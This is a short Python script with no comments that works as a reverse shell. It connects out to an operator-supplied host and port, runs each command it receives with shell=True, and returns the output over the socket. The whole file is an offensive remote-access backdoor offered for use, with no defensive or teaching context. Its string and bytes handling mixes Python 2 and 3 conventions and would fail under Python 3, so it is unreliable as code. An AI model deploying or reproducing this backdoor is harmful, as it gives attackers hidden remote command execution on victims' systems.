import socket
import subprocess
import argparse
import sys
import time
import threading

def connectHost(ht,pt):
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ht,int(pt)))
	while True:
		data = sock.recv(1024)
		print ("recv:" +data)
		data = data.decode('utf-8')
		comRst = subprocess.Popen(data,shell=True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin=subprocess.PIPE)
		m_stdout,m_stderr = comRst.communicate()
		out = m_stdout.decode(sys.getfilesystemencoding()).encode('utf-8')
		if out == "":
			sock.send("ok")
		else:
			sock.send(out)
		time.sleep(1)
	sock.close()

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-H',dest='hostName',help='Host Name')
	parser.add_argument('-P',dest='conPort',help='Host Port')
	args = parser.parse_args()
	host = args.hostName
	port = args.conPort
	if host == None and port == None:
		print(parser.parse_args(['-h']))
	connectHost(host,port)

if __name__ == '__main__':
	main()
